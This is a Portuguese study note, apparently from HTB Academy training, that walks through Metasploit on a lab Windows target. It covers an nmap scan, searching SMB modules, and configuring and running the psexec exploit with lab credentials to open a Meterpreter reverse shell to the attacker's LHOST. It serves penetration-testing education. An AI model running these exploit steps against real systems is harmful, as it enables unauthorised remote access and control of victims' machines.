Nesta seção, interagiremos com o `community edition`Metasploit no Pwnbox. Usaremos `modules`payloads pré-construídos e artesanais com `MSFVenom`. É importante observar que muitas empresas de segurança cibernética estabelecidas utilizam a edição paga do Metasploit chamada `Metasploit Pro`para conduzir testes de penetração, auditorias de segurança e até mesmo campanhas de engenharia social. Se você quiser explorar as diferenças entre a edição da comunidade e o Metasploit Pro, pode conferir este [gráfico de comparação](https://www.rapid7.com/products/metasploit/download/editions/) .

## Praticando com Metasploit

Vamos começar a trabalhar na prática com o Metasploit iniciando o console do framework Metasploit como root ( `sudo msfconsole`)
#### Iniciando MSF

```bash
sudo msfconsole
```
![[Pasted image 20240830080246.png]]

Podemos ver que há arte ASCII criativa apresentada como banner no lançamento e alguns números de interesse particular.
- `2131` exploits
- `592` cargas úteis

Vamos nos familiarizar com as cargas úteis do Metasploit usando um clássico `exploit module`que pode ser usado para comprometer um sistema Windows. Lembre-se de que o Metasploit pode ser usado para mais do que apenas exploração. Também podemos usar módulos diferentes para escanear e enumerar alvos.

#### Varredura NMAP

```bash
nmap -sC -sV -Pn 10.129.164.25
```
![[Pasted image 20240830080218.png]]

Na saída, vemos várias portas padrão que normalmente são abertas em um sistema Windows por padrão. Lembre-se de que escaneamento e enumeração são uma excelente maneira de saber qual SO (Windows ou Linux) nosso alvo está executando para encontrar um módulo apropriado para executar com o Metasploit. Vamos usar `SMB`(ouvindo em `445`) como o vetor de ataque potencial.

Uma vez que tenhamos essas informações, podemos usar a funcionalidade de busca do Metasploit para descobrir módulos que estão associados ao SMB. No `msfconsole`, podemos emitir o comando `search smb`para obter uma lista de módulos associados às vulnerabilidades do SMB:

#### Pesquisando no Metasploit

```msf6
msf6 > search smb
```
![[Pasted image 20240830080723.png]]

Veremos uma longa lista de `Matching Modules`associados à nossa busca. Observe o formato de cada módulo. Cada módulo tem um número listado na extrema esquerda da tabela para facilitar a seleção do módulo, um `Name`, `Disclosure Date`, `Rank`e .`Check``Description`

> [!NOTE] O número à `esquerda` de cada módulo potencial é um número relativo baseado na sua busca que pode mudar conforme os módulos são adicionados ao Metasploit. Não espere que esse número corresponda toda vez que você fizer a busca ou tentar usar o módulo.

Vamos analisar um módulo em particular para entendê-lo dentro do contexto de cargas úteis.

`56 exploit/windows/smb/psexec`

| Saída      | Significado                                                                                                                                                                |
| ---------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `56`       | O número atribuído ao módulo na tabela dentro do contexto da busca. Esse número facilita a seleção. Podemos usar o comando `use 56`para selecionar o módulo.               |
| `exploit/` | Isto define o tipo de módulo. Neste caso, este é um módulo de exploração. Muitos módulos de exploração no MSF incluem o payload que tenta estabelecer uma sessão de shell. |
| `windows/` | Isso define a plataforma que estamos mirando. Neste caso, sabemos que o alvo é o Windows, então o exploit e o payload serão para o Windows.                                |
| `smb/`     | Isso define o serviço para o qual a carga útil no módulo é escrita.                                                                                                        |
| `psexec`   | Isso define a ferramenta que será carregada no sistema de destino se ele estiver vulnerável.                                                                               |

Depois de selecionar o módulo, notaremos uma alteração no prompt que nos dá a capacidade de configurar o módulo com base em parâmetros específicos do nosso ambiente.

#### Seleção de opções
```msf6
msf6 > use 56
```
![[Pasted image 20240830081018.png]]

Observe como `exploit`está fora dos parênteses. Isso pode ser interpretado como o tipo de módulo MSF sendo um exploit, e o exploit específico e o payload são escritos para Windows. O vetor de ataque é `SMB`, e o payload Meterpreter será entregue usando [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) . Vamos aprender mais sobre como usar esse exploit e entregar o payload usando o `options`comando.

#### Examinando as opções de um Exploit

```msf6
msf6 exploit(windows/smb/psexec) > options
```
![[Pasted image 20240830081549.png]]

Não usaremos `SERVICE_DESCRIPTION`, `SERVICE_DISPLAY_NAME`e `SERVICE_NAME`nesta seção. Observe como este exploit em particular usará uma conexão de shell TCP reversa utilizando `Meterpreter`.

Um shell Meterpreter nos dá muito mais funcionalidade do que um shell TCP reverso bruto, como estabelecemos nas seções anteriores deste módulo. É o payload padrão usado no Metasploit.

Usaremos o `set`comando para configurar as seguintes configurações:

#### Opções de configuração

```msf6
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71

msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$

msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!

msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student

msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

Essas configurações garantirão que nossa carga útil seja entregue ao destino apropriado ( `RHOSTS`), carregada no compartilhamento administrativo padrão ( `ADMIN$`) utilizando credenciais ( `SMBPass`& `SMBUser`) e, em seguida, inicie uma conexão de shell reversa com nossa máquina host local ( `LHOST`).

#### Explorações à distância

```msf6
msf6 exploit(windows/smb/psexec) > exploit
```
![[Pasted image 20240830081922.png]]

Após emitirmos o `exploit`comando, o exploit é executado, e há uma tentativa de entregar a carga útil no alvo utilizando a carga útil do Meterpreter.  Sabemos que isso foi bem-sucedido porque um foi `stage`enviado com sucesso, o que estabeleceu uma sessão de shell do Meterpreter ( `meterpreter >`) e uma sessão de shell em nível de sistema. Meterpreter é uma carga útil que usa injeção de DLL na memória para estabelecer furtivamente um canal de comunicação entre uma caixa de ataque e um alvo.

Neste caso, conforme detalhado na [Documentação do Módulo Rapid 7](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/) : "Este módulo usa um nome de usuário e senha de administrador válidos (ou hash de senha) para executar uma carga útil arbitrária. Este módulo agora é capaz de limpar depois de si mesmo. O serviço criado por esta ferramenta usa um nome e uma descrição escolhidos aleatoriamente. "v

Como outros intérpretes de linguagem de comando (Bash, PowerShell, ksh, etc...), as sessões de shell do Meterpreter nos permitem emitir um conjunto de comandos que podemos usar para interagir com o sistema de destino. Podemos usar o `?`para ver uma lista de comandos que podemos usar.

Notaremos limitações com o shell do Meterpreter, então é bom tentar usar o `shell`comando para cair em um shell de nível de sistema se precisarmos trabalhar com o conjunto completo de comandos de sistema nativos para nosso destino.
#### Shell Interativo
![[Pasted image 20240830082617.png]]




























































































